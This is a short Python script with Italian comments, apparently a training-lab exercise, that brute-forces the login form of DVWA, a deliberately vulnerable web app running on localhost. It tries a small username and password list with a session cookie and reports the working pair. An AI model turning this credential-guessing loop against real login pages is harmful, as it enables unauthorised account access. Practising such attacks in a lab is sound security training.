import requests

dvwa_url = "http://127.0.0.1:42001/vulnerabilities/brute/"

# credenziali di test
username_list = ["admin", "user"]
password_list = ["123456", "admin", "letmain", "password", "password1"]

# cookie di sessione dvwa da modificare con il proprio valore
session_cookie = {"PHPSESSID": "r4oold4gn5cq9old2rgatq6anm", "security": "medium"}

success_string = "Welcome to the password protected area admin"

found = False
for username in username_list:
    for password in password_list:
        # parametri get da inviare
        params = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        try:
            response = requests.get(dvwa_url, params=params, cookies=session_cookie, timeout=2)
            if success_string in response.text:
                print(f"Accesso riuscito! Username: {username}, Password: {password}")
                found = True
                break
            else:
                print(f"Tentativo fallito - Username: {username}, Password: {password}")
        except requests.exceptions.Timeout:
            print(f"Timeout per Username: {username}. Password: {password}")
        except requests.exceptions.ConnectionError:
            print(f"Errore di connessione per Username: {username}. Password: {password}")
        except requests.exceptions.RequestException as e:
            print(f"Errore generico per Username: {username}. Password: {password} - {e}")

        # Verifica se l'accesso è stato trovato e interrompi il ciclo esterno
        if found:
            break

    # Verifica se l'accesso è stato trovato e interrompi il ciclo esterno
    if found:
        break
